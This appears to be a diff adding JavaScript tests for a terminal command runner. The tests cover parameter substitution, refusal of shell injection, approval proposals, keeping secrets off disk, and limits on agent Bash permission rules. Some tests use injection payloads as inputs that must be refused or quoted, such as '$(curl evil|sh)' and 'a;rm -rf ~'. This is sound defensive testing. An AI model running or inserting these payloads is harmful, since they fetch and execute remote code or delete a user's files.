@@ -202,6 +202,11 @@ class FakeTabs {
     this.sends.push({ pty, text: r.text, purpose: r.purpose, submit: r.submit, by });
     t.out += `$ ${r.text}\n`;
     t.state = 'busy';
+    if (this.endOnSend != null) {
+      // The command dies at once (exit 127): its end signal is the next PTY event.
+      const code = this.endOnSend;
+      setTimeout(() => this.end(pty, code, 'command not found\n'), 0);
+    }
     return { success: true, chars: r.text.length };
   }
   async openTab(o) {
@@ -361,7 +366,7 @@ test('config: merge order, validation, services mapping', () => {
 });
 
 test('command helpers: params, matching, argv0', () => {
-  assert.deepStrictEqual(cfg.substituteParams('idf.py -p {port} flash', ['port'], {}), { line: 'idf.py -p {port} flash', missing: ['port'] });
+  assert.deepStrictEqual(cfg.substituteParams('idf.py -p {port} flash', ['port'], {}), { line: 'idf.py -p {port} flash', missing: ['port'], invalid: [] });
   assert.strictEqual(cfg.substituteParams('idf.py -p {port} flash', ['port'], { port: "/dev/cu.x'y" }).line, `idf.py -p '/dev/cu.x'\\''y' flash`);
   const def = { name: 'f', kind: 'oneshot', command: 'idf.py -p {port} flash', match: ['vite*'] };
   assert.ok(cfg.commandMatchesOperation(def, 'idf.py  -p /dev/cu.usb   flash'));
@@ -637,6 +642,80 @@ test('C3 table: local, device, Hester, LAN', async () => {
   assert.strictEqual((await domain('stop', { workspace: ws, name: 'flash-dev' }, HESTER)).status, 403);
 });
 
+test('params: quoted placeholders and metacharacters; Hester params go through a proposal; approval runs the shown line', async () => {
+  const q = cfg.quotedPlaceholders(`git commit -am "{msg}" && echo '{x}' {y} "a\\"{z}"`);
+  assert.deepStrictEqual([...q.entries()].sort(), [['msg', '"'], ['x', "'"], ['z', '"']]);
+  assert.deepStrictEqual(cfg.substituteParams('git commit -am "{msg}"', [], { msg: '$(curl evil|sh)' }).invalid, ['msg']);
+  assert.deepStrictEqual(cfg.substituteParams("echo '{x}'", [], { x: 'a;rm -rf ~' }).invalid, ['x']);
+  assert.deepStrictEqual(cfg.substituteParams("echo '{x}'", [], { x: 'a b' }).invalid, ['x'], 'word splitting inside single quotes');
+  assert.strictEqual(cfg.substituteParams("echo '{x}'", [], { x: 'plain-word.txt' }).line, "echo ''plain-word.txt''");
+  assert.strictEqual(cfg.substituteParams('echo {x}', [], { x: '$(id)' }).line, "echo '$(id)'", 'an unquoted placeholder is single-quoted');
+  assert.deepStrictEqual(cfg.substituteParams('echo {x}', [], { x: '$(id)' }, { strict: true }).invalid, ['x']);
+  assert.deepStrictEqual(cfg.substituteParams('echo {x}', [], { x: 'fix: the thing' }, { strict: true }).invalid, []);
+
+  const file = path.join(ws, '.lee', 'operations.yaml');
+  const orig = fs.readFileSync(file, 'utf8');
+  const bump = () => {
+    const t = new Date(Date.now() + Math.floor(Math.random() * 100000));
+    fs.utimesSync(file, t, t);
+  };
+  fs.writeFileSync(file, orig.replace('operations:\n', 'operations:\n  - name: commit-wip\n    command: git commit -am "{msg}"\n  - name: greet\n    command: echo {who}\n'));
+  bump();
+  try {
+    let n = tabs.sends.length;
+    let r = await ipc('opsRun', { workspace: ws, name: 'commit-wip', params: { msg: '$(curl evil|sh)' }, confirmed: true });
+    assert.strictEqual(r.error, 'invalid_params');
+    assert.strictEqual(tabs.sends.length, n, 'nothing typed');
+    r = await ipc('opsRun', { workspace: ws, name: 'commit-wip', params: { msg: 'wip' } });
+    assert.ok(r.success, JSON.stringify(r));
+    tabs.end(r.run.pty_id, 0);
+    // A device's metacharacters are refused outright.
+    assert.strictEqual((await domain('run', { workspace: ws, name: 'greet', params: { who: '$(id)' } }, DEVICE)).status, 400);
+    // Hester with params: a proposal showing the substituted line; nothing typed.
+    n = tabs.sends.length;
+    const out = await domain('run', { workspace: ws, name: 'greet', params: { who: 'world' } }, HESTER);
+    assert.strictEqual(out.status, 202, JSON.stringify(out));
+    assert.strictEqual(tabs.sends.length, n);
+    const entry = cockpitBus.feed.list(ws).find((e) => e.ref.proposal_id === out.body.proposal_id);
+    assert.strictEqual(entry.actions[0].confirm_text, `cd '${ws}' && echo 'world'`);
+    // The definition changes before the click: the old proposal can't run the new text.
+    fs.writeFileSync(file, orig.replace('operations:\n', 'operations:\n  - name: greet\n    command: echo {who} --and-more\n'));
+    bump();
+    const changed = await cockpitBus.actOnFeed(entry.id, 'approve', {}, LOCAL);
+    assert.strictEqual(changed.success, false);
+    assert.strictEqual(changed.error, 'changed');
+    assert.strictEqual(tabs.sends.length, n, 'nothing typed');
+    const fresh = cockpitBus.feed.list(ws).find((e) => e.ref.proposal_id === changed.data.proposal_id);
+    assert.strictEqual(fresh.actions[0].confirm_text, `cd '${ws}' && echo 'world' --and-more`);
+    const ok = await cockpitBus.actOnFeed(fresh.id, 'approve', {}, LOCAL);
+    assert.ok(ok.success, JSON.stringify(ok));
+    assert.ok(tabs.sends.at(-1).text.endsWith(`echo 'world' --and-more`));
+    tabs.end(ok.data.run.pty_id, 0);
+  } finally {
+    fs.writeFileSync(file, orig);
+    bump();
+  }
+  assert.ok(!cockpitBus.ops.snapshot(ws).operations.some((o) => o.def.name === 'greet'));
+});
+
+test('no command text on disk: ad-hoc tab label, echoed line, ad-hoc output', async () => {
+  const opened = tabs.opened.length;
+  const secret = 'psql postgres://admin:pw-SECRET@db/prod -c select';
+  const r = await ipc('opsRun', { workspace: ws, command: secret, confirmed: true });
+  assert.ok(r.success, JSON.stringify(r));
+  assert.strictEqual(tabs.opened.length, opened + 1);
+  assert.strictEqual(tabs.opened.at(-1).label, '▶ adhoc:psql');
+  tabs.end(r.run.pty_id, 0, 'row 1\n');
+  const dir = path.join(tmpHome, '.lee', 'ops', rtMod.wsidFor(ws));
+  for (const f of fs.readdirSync(dir)) assert.ok(!fs.readFileSync(path.join(dir, f), 'utf8').includes('pw-SECRET'), `${f} holds no command text`);
+  assert.ok(!fs.existsSync(path.join(dir, 'adhoc_psql.last.log')));
+  const b = await ipc('opsRun', { workspace: ws, name: 'bench' });
+  tabs.end(b.run.pty_id, 0, 'cold_start_ms=1000\n');
+  const log = fs.readFileSync(path.join(dir, 'bench.last.log'), 'utf8');
+  assert.strictEqual(log, 'cold_start_ms=1000\n', 'the echoed line is dropped');
+  assert.strictEqual(rtMod.dropEchoedLine('$ make\nout\n'), 'out\n');
+});
+
 test('stop: Ctrl-C into the running tab', async () => {
   const r = await ipc('opsRun', { workspace: ws, name: 'failing' });
   const out = await domain('stop', { workspace: ws, name: 'failing' }, HESTER);
@@ -674,6 +753,31 @@ test('hand-typed commands link to operations; long-running status; crash is bloc
   assert.ok((await ipc('opsLinkTab', 61, ws, 'web')).success);
   assert.strictEqual(cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web').linked_pty_id, 61);
   assert.ok((await ipc('opsLinkTab', 61, ws, null)).success);
+});
+
+test('a run that ends at once: result after run, crash state kept', async () => {
+  tabs.endOnSend = 127;
+  let r;
+  try {
+    r = await ipc('opsRun', { workspace: ws, name: 'web', confirmed: true });
+  } finally {
+    tabs.endOnSend = null;
+  }
+  assert.ok(r.success, JSON.stringify(r));
+  await waitFor(() => eventsOf('operation.result').some((e) => e.data.run_id === r.run.run_id));
+  const idx = (type) => events.findIndex((e) => e.type === type && e.data.run_id === r.run.run_id);
+  assert.ok(idx('operation.run') >= 0 && idx('operation.run') < idx('operation.result'), 'operation.run before operation.result');
+  assert.strictEqual(cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web').status, 'crashed');
+  // Hand-typed: a command that dies before git answers still logs run before result.
+  tabs.add(62, { cwd: ws });
+  tabs.start(62, 'npm run dev');
+  tabs.end(62, 1, '', 'user');
+  const handRun = eventsOf('operation.run').length;
+  await waitFor(() => eventsOf('operation.run').length > handRun - 1 && events.filter((e) => e.type === 'operation.result' && e.data.by === 'user').length > 0);
+  await sleep(50);
+  const lastRun = eventsOf('operation.run').filter((e) => e.data.pty_id === 62).pop();
+  const lastRes = events.findIndex((e) => e.type === 'operation.result' && e.data.run_id === lastRun.data.run_id);
+  assert.ok(events.indexOf(lastRun) < lastRes, 'hand-typed: run before result');
 });
 
 test('confirm suggestions: operations.yaml round trip keeps hand edits; config.yaml untouched', async () => {
@@ -734,12 +838,22 @@ test('operation agents: launch request and claude argv; C2 guards', async () => 
   await ipc('opsAgent', { workspace: ws, purpose: 'fix', op: 'flash-dev' });
   assert.deepStrictEqual(launcher.launches.at(-1).req.allowed_tools, ['Read', 'Grep', 'Glob', 'Bash(idf.py:*)', 'Bash(ls /dev/cu.*)']);
   assert.strictEqual(agentMod.bashRuleFor('npm run build'), 'Bash(npm run:*)');
+  // Never an interpreter- or wrapper-wide allow (C3).
+  assert.strictEqual(agentMod.bashRuleFor('python -m pytest'), 'Bash(python -m pytest:*)');
+  assert.strictEqual(agentMod.bashRuleFor('node --test'), 'Bash(node --test:*)');
+  assert.strictEqual(agentMod.bashRuleFor('uv run pytest'), 'Bash(uv run pytest:*)');
+  assert.strictEqual(agentMod.bashRuleFor('pdm run test'), 'Bash(pdm run test:*)');
+  assert.strictEqual(agentMod.bashRuleFor(`sh -c 'make all'`), null);
+  assert.strictEqual(agentMod.bashRuleFor('bash scripts/ci.sh'), null);
+  assert.strictEqual(agentMod.bashRuleFor('npx vitest run'), 'Bash(npx vitest run:*)');
+  assert.strictEqual(agentMod.bashRuleFor('python -c "import os"'), null);
   assert.strictEqual(agentMod.bashRuleFor('. /x/export.sh >/dev/null && idf.py build'), 'Bash(idf.py build:*)');
   // Ad-hoc; multi_step uses plan_model.
   await ipc('opsAgent', { workspace: ws, purpose: 'adhoc', request: 'flash the tdeck and open the monitor', multi_step: true });
   const a = launcher.launches.at(-1).req;
   assert.strictEqual(a.model, 'sonnet');
   assert.strictEqual(a.title, 'Op: flash the tdeck and open the monitor');
+  assert.strictEqual(a.label, 'Op agent', 'the request never becomes a tab label');
   assert.deepStrictEqual(a.allowed_tools, ['Read', 'Grep', 'Glob', 'Bash(ls:*)']);
   assert.deepStrictEqual(a.origin, { kind: 'operation', ref: null });
   assert.strictEqual(eventsOf('opagent.launch').length, 3);
